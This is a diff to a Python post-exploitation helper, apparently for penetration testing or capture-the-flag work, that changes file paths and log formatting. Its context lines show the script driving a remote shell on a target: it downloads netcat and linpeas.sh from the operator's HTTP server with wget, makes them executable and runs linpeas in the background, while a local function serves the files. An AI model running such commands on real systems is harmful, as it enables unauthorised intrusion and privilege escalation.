@@ -16,7 +16,7 @@ logger = logging.getLogger(__name__)  # __name__ is the name of the current modu
 logger.setLevel(logging.DEBUG)  # set the logging level to DEBUG
 
 formatter = colorlog.ColoredFormatter(
-    '%(log_color)s%(levelname)s:%(message)s',
+    '%(log_color)s%(message)s',
     log_colors={
         'DEBUG': 'cyan',
         'INFO': 'green',
@@ -28,8 +28,6 @@ formatter = colorlog.ColoredFormatter(
 
 handler = colorlog.StreamHandler()
 handler.setFormatter(formatter)
-
-
 
 def parse_args():
     parser = argparse.ArgumentParser()
@@ -46,7 +44,7 @@ def parse_args():
 
 
 def get_file(tmp_dir, ip, lport, p, filename):
-    p.sendline(f"wget http://{ip}:{lport}/www/{filename} -O {tmp_dir}/{filename}".encode())
+    p.sendline(f"wget http://{ip}:{lport}/{filename} -O {tmp_dir}/{filename}".encode())
     p.sendline(f"chmod +x {tmp_dir}/{filename}".encode())
 
 
@@ -63,7 +61,7 @@ def reverse_shell_recon(tmp_dir, port, current_os, lport, ip, mport):
 
     p.sendline(f"mkdir {tmp_dir}".encode())
     get_file(tmp_dir, ip, lport, p, "nc")
-    p.sendline(f"wget http://{ip}:{lport}/www/linpeas.sh -O {tmp_dir}/linpeas.sh".encode())
+    p.sendline(f"wget http://{ip}:{lport}/linpeas.sh -O {tmp_dir}/linpeas.sh".encode())
     p.sendline(f"chmod +x {tmp_dir}/linpeas.sh".encode())
     p.sendline(f"cd {tmp_dir}".encode())
     p.sendline(f"nohup ./linpeas.sh -w -q -s < /dev/null > linpeas.txt 2>&1 &".encode())
@@ -75,6 +73,7 @@ def reverse_shell_recon(tmp_dir, port, current_os, lport, ip, mport):
 
 def file_server(lport):
     p = process("/bin/bash")
+    p.sendline("cd www".encode())
     p.sendline(f"python3 -m http.server {lport}".encode())
     logger.info(f"[+] File server is listening on port {lport}")
 
